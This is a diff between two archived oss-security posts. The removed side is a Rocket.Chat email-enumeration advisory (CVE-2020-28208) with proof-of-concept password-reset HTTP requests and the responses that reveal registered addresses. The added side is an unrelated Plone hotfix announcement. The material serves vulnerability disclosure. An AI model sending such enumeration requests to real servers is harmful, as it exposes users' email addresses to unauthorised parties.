@@ -1,132 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/01/08/1
-Message-ID: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
-Date: Fri, 08 Jan 2021 10:11:22 +0000
-From: Stefan Pietsch <s.pietsch@...vent.io>
-To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
-Subject: Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/21/1
+Message-ID: <0919707c-0f29-ac46-35f5-d6890faf0f4e@vanrees.org>
+Date: Fri, 21 May 2021 16:07:57 +0200
+From: Maurits van Rees <maurits@...rees.org>
+To: oss-security@...ts.openwall.com
+Subject: Plone security hotfix 20210518
 Content-Type: text/plain; charset=utf-8
 
-# Trovent Security Advisory 2010-01 #
-#####################################
+A Plone security hotfix was released on Tuesday, May 18 2021.
+For details, see https://plone.org/security/hotfix/20210518
+Most CVE numbers are not yet issued. I will request them from Mitre shortly.
 
+BTW, I am following the instructions at 
+https://oss-security.openwall.org/wiki/mailing-lists/oss-security#cve-requests 
+to first post to this list, then request CVEs at Mitre, then reply to my 
+own post.
+I don't see many other people doing it in this order. Is that page still 
+accurate?
 
-Email address enumeration in reset password
-###########################################
+Versions Affected: All supported Plone versions (4.3.20 and any earlier 
+4.3.x version, 5.2.4 and any earlier 5.x version).
 
+Versions Not Affected: None. Earlier versions may be affected, but the 
+hotfix has not been tested on them.
 
-Overview
-########
+The patch addresses several security issues:
 
-Advisory ID: TRSA-2010-01
-Advisory version: 1.1
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2010-01
-Affected product: Web application Rocket.Chat
-Affected version: <= 3.7.1
-Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
-Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+- Remote Code Execution via traversal in expressions. Reported by David 
+Miller. CVE-2021-32633.
+- Writing arbitrary files via docutils and Python Script. Reported by 
+Calum Hutton.
+- Various information disclosures: mostly installation logs. Reported by 
+Calum Hutton. CVE-2021-21360 and CVE-2021-21336.
+- Stored XSS from file upload (svg, html). Reported separately by Emir 
+Cüneyt Akkutlu and Tino Kautschke.
+- Reflected XSS in various spots. Reported by Calum Hutton.
+- XSS vulnerability in CMFDiffTool. Reported by Igor Margitich.
+- Stored XSS from user fullname. Reported by Tino Kautschke.
+- Blind SSRF via feedparser accessing an internal URL. Reported by 
+Subodh Kumar Shree.
+- Server Side Request Forgery via event ical URL. Reported by MisakiKata 
+and David Miller.
+- Server Side Request Forgery via lxml parser. Reported by MisakiKata 
+and David Miller.
 
+A hotfix package has been created at 
+https://pypi.org/project/Products.PloneHotfix20210518/
+The fixes will be incorporated in future release Plone 5.2.5.
 
-Detailed description
-####################
+-- 
+Maurits van Rees https://maurits.vanrees.org/
+Plone Security Team security@...ne.org
 
-Trovent Security GmbH discovered an email address enumeration vulnerability
-in the password reset function of the chat application Rocket.Chat. This vulnerability lets
-an unauthorized user enumerate registered email addresses on the instance of Rocket.Chat.
-
-Severity: Medium
-CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-CVE ID: CVE-2020-28208
-CWE ID: CWE-204
-
-
-Proof of concept
-################
-
-Sample HTTP request sent with a registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 122
-Accept: */*
-Content-Type: application/json
-
-
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@...t.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-The server response to a valid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:01:25 GMT
-Connection: keep-alive
-Content-Length: 78
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-Sample HTTP request sent with a non registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 119
-Accept: */*
-Content-Type: application/json
-
-
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@...t.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-The server response to an invalid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:03:08 GMT
-Connection: keep-alive
-Content-Length: 79
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-Solution / Workaround
-#####################
-
-Ensure the application returns consistent generic server responses independent
-of the email address entered during the password reset process.
-
-Fixed in Rocket.Chat version 3.9.2.
-
-
-History
-#######
-
-2020-10-27: Vulnerability found
-2020-11-03: Advisory created and CVE ID requested
-2020-11-06: Vendor contacted and informed about planned disclosure date
-2020-11-06: Vendor confirmed vulnerability, working on a fix
-2021-01-07: Advisory published
-2021-01-08: Vendor sent us information about fixed version
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
